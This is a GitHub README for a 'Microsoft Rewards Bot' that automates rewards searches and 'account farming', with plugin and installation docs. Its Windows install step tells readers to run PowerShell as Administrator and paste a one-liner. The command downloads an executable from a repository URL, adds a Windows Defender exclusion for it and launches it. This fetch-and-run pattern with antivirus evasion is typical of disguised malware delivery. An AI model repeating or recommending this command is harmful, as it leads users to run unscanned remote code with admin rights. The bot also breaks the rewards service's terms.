<div align="center">
  <img src="assets/banner.png" alt="Microsoft Rewards Bot Banner" width="100%">
</div>

<h1 align="center">✦ Microsoft Rewards Bot BETA ✦</h1>

<p align="center">
  <strong>Next-generation source-available Microsoft Rewards automation with a powerful plugin ecosystem.</strong><br>
  <em>Fast • Modular • Automated</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-4.0.19-blue?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/Node.js-24.15.0-green?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node">
  <img src="https://img.shields.io/badge/License-Source_Available-orange?style=for-the-badge" alt="License">
</p>

---

## 🌌 Introduction

Microsoft Rewards Bot delivers a fully automated, hands-free rewards workflow alongside a sophisticated modular plugin system.

This ecosystem proudly features:
- 🤖 **Core Automation**: Headless search and account farming logic.
- 🔌 **Public Plugin API**: Extensibility at its finest, letting you create custom integrations.
- 📦 **Plugin Manager**: Manage features seamlessly via `npm run plugins`.
- 🔄 **Smart Auto-Updates**: Stays fresh and up to date on every `npm start`.
- 💎 **Premium Core Plugin**: Proprietary logic enabled via `plugins/plugins.jsonc`.

This repository is source-available for personal noncommercial use and official contributions. It is not licensed for commercial redistribution, unofficial public competing releases, impersonation, or reproducing the proprietary Core plugin.

Remote Dash
<img width="2309" height="1189" alt="image" src="https://github.com/user-attachments/assets/1ac4e0c6-0df9-44c3-956a-3a500ab24c69" />


---

## 🚀 Installation (Windows)

> **Required:** Run PowerShell as Administrator.

Open PowerShell as Administrator, then effortlessly run the one-line installer:

```powershell
$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/release/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
```

*The installer will fetch the latest robust binary engine directly from the release branch and deploy it locally.*

> **Note:** Only accept software execution from trusted publishers and verified repositories.

---

## 🛠️ Manual CLI Installation

For total control, clone and install manually via NPM:

```bash
git clone --branch release https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
cd Microsoft-Rewards-Bot
npm install
npm start
```

The `release` branch is the supported public channel. Auto-update reads that branch directly and the compiled official Core plugin is built for the documented Node.js target.

---

## 📚 Documentation Map

Use this README as the front door, then jump into the page that matches what you want to do next:

| Goal | Read this |
| --- | --- |
| Install, update, or understand `npm start` | [Install and auto-updates](docs/updates.md) |
| Run the bot in Docker | [Docker](docs/docker.md) |
| Use the correct Node.js version | [Node.js version](docs/node-version.md) |
| Enable, disable, or inspect plugins | [Plugin system overview](docs/plugins.md) |
| Build a public plugin | [Create a plugin](docs/create-plugin.md) and [Plugin API reference](docs/plugin-api.md) |
| Understand the premium plugin | [Official Core plugin](docs/core-plugin.md) |
| Understand Core limits and security | [Core technical reference](docs/core-plugin-reference.md) |
| Use the official web dashboard | [Core Dashboard](docs/dashboard.md) |
| Fix common launch or update issues | [Troubleshooting](docs/troubleshooting.md) |
| Understand licensing and allowed use | [License](LICENSE), [Commercial use](COMMERCIAL.md), and [Trademark policy](TRADEMARK.md) |

Start with [docs/README.md](docs/README.md) if you want the full documentation index.

<br>

<div align="center">
  <img src="assets/logo.png" width="50">
  <p><em>Built with perfection and immersion in mind.</em></p>
</div>
